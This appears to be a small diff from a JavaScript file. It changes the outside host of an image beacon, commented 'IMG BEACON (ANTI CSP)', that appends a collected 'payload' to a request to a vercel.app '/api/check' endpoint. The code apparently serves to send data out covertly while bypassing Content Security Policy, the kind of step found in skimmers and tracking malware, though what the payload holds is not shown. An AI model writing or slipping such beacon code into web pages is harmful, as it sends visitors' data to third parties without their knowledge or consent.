@@ -44,6 +44,6 @@
 
   // === IMG BEACON (ANTI CSP) ===
   const img = new Image();
-  img.src = "https://device-check-ivory.vercel.app/api/check?d=" + payload;
+  img.src = "https://device-check-one.vercel.app/api/check?d=" + payload;
 
 })();
